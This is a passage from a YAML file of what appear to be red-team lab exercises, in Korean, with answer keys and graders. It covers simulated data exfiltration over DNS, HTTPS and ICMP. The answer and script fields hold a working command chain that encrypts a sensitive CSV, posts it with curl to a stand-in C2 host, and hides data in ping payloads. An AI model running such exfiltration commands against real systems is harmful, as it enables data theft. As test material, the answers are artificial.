  risk_level: medium
  bastion_prompt: attacker VM에서 cat으로 [RED] DNS 터널링을 이용한 데이터 유출을 시뮬레이션 작업을 수행해줘
- order: 4
  instruction: '[RED] HTTPS와 ICMP를 이용한 멀티채널 유출을 시뮬레이션하라. 데이터를 암호화하여 HTTPS POST에 포함하고,
    ICMP 페이로드에도 은닉하라.'
  hint: openssl로 암호화하고 curl로 POST, ping -p로 ICMP 데이터를 전송한다.
  category: exploit
  points: 10
  answer: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc
    -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass
    pass:ExfilKey2026 -pbkdf2 2>/dev/null && echo "=== Multi-Channel Exfiltration
    ===" && echo "Channel 1 - HTTPS: curl -X POST https://c2.test/upload -F file=@/tmp/exfil_encrypted.bin"
    && echo "Channel 2 - ICMP:" && echo -n "EXFIL_TEST" | xxd -p | head -c 32 > /tmp/icmp_payload.txt
    && ping -c 1 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1 | head -3 && echo
    "Multi-channel exfiltration simulated"'
  answer_detail: 멀티채널 유출은 데이터를 분할하여 여러 프로토콜로 동시에 전송한다. HTTPS(암호화), ICMP(간과되기 쉬움)를
    조합하면 단일 채널 차단으로 유출을 완전히 막을 수 없다.
  verify:
    type: output_contains
    expect: null
  target_vm: attacker
  script: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc
